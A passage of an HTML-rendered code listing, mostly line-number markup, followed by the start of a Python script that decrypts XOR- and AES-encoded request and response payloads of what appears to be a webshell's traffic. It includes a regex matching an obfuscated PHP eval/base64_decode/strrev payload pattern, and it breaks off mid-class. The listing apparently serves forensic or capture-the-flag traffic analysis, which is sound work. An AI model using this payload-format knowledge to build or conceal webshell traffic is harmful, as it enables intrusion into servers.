class=&#34;line&#34;&gt;152&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;153&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;154&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;155&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;156&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;157&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;158&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;159&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;160&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;161&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;162&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;163&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;164&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;165&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;166&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;167&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;168&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;169&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;170&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;171&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;172&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;173&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;174&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;175&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;176&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;177&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;178&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;179&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;180&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;181&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;182&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;183&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;184&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;185&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;186&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;187&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;188&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;189&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;190&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;191&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;192&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;193&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;194&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;195&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;196&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;197&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;198&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;199&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;200&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;201&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;202&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;203&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;204&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;205&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;206&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;207&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;208&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;209&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;210&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;211&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;212&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;213&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;214&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;215&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;216&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;217&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;218&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;219&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;220&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;221&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;222&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;223&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;224&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;225&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;226&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;227&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;228&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;229&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;230&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;231&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;232&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;233&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;234&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;235&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;236&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;237&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;238&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;239&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;240&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;241&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;242&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;243&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;244&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;245&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;246&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;247&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;248&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;249&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;250&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;251&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;252&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;253&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;254&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;255&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;256&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;257&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;258&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;259&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;260&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;261&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;262&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;263&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;264&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;265&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;266&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;267&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;268&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;269&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;270&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;271&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;272&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;273&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;274&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;275&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;276&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;277&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;278&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;279&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;280&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;281&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;282&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;283&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;284&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;285&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;286&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;287&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;288&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;289&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;290&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;291&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;292&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;293&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;294&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;295&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;296&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;297&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;298&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;299&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;300&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;301&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;302&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;303&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;304&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;305&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;306&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;307&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;308&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;309&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;310&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;311&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;312&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;313&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;314&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;315&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;316&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;317&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;318&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;319&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;320&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;321&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;322&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;323&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;324&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;325&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;326&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;327&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;328&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;329&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;330&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;331&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;332&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;333&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;334&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;335&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;336&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;337&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;338&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;339&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;340&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;341&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;342&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;343&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;344&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;345&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;346&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;347&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;348&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;349&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;350&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;351&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;352&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;353&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;354&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;355&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;356&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;357&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;358&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;359&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;360&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;361&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;362&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;363&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;364&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;365&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;366&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;367&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;368&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;369&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;370&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;371&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;372&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;373&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;374&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;375&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;376&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;377&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;378&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;379&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;380&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;381&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;382&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;383&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;384&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;385&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;386&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;387&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;388&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;389&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;390&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;391&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;392&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;393&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;394&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;395&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;396&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;397&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;398&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;399&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;400&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;401&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;402&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;403&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;404&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;405&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;406&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;407&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;408&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;409&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;410&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;411&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;412&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;413&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;414&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;415&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;416&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;417&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;418&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;419&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;420&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;421&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;422&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;423&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;424&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;425&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;426&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;427&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;428&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;429&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;430&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;431&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;432&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;import base64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import gzip&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import re&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;from urllib.parse import unquote&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;from Crypto.Cipher import AES&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;def unpad(s):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    return s[:-ord(s[len(s) - 1:])]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;def XOR(D, K):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    result = []&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    for i in range(len(D)):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        c = K[i + 1 &amp;amp; 15]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        if not isinstance(D[i], int):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            d = ord(D[i])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        else:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            d = D[i]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        result.append(d ^ ord(c))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    return b&amp;#x27;&amp;#x27;.join([i.to_bytes(1, byteorder=&amp;#x27;big&amp;#x27;) for i in result])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;class PHP_XOR_BASE64:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    def __init__(self, pass_, key):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.pass_ = pass_&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.key = key&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    def decrypt_req_payload(self, payload):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        payload = payload.decode().split(self.pass_ + &amp;#x27;=&amp;#x27;)[1]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        return XOR(base64.b64decode(unquote(payload)), self.key)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    def decrypt_res_payload(self, payload):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        payload = payload[16:-16]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        return gzip.decompress(XOR(base64.b64decode(payload.decode()), self.key))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;class PHP_XOR_RAW:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    def __init__(self, pass_, key):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.pass_ = pass_&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.key = key&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    def decrypt_req_payload(self, payload):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        return XOR(payload, self.key)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    def decrypt_res_payload(self, payload):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        return gzip.decompress(XOR(payload, self.key))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;class PHP_EVAL_XOR_BASE64:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    def __init__(self, pass_, key):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.pass_ = pass_&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.key = key&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    def decrypt_req_payload(self, payload):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        body = unquote(payload.decode())&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        match = re.findall(r&amp;quot;eval\(base64_decode\(strrev\(urldecode\(&amp;#x27;(.*)&amp;#x27;\)&amp;quot;, str(body))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        # encode_body = regexphp(,body)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        tmp = reversed(match[0])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        tmp_base64 = &amp;#x27;&amp;#x27;.join(tmp)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        return base64.b64decode(tmp_base64)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    def decrypt_res_payload(self, payload):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        payload = payload[16:-16]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        return gzip.decompress(XOR(base64.b64decode(payload.decode()), self.key))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;class JAVA_AES_BASE64:&lt;/span&gt;&lt;br&gt;&lt;span 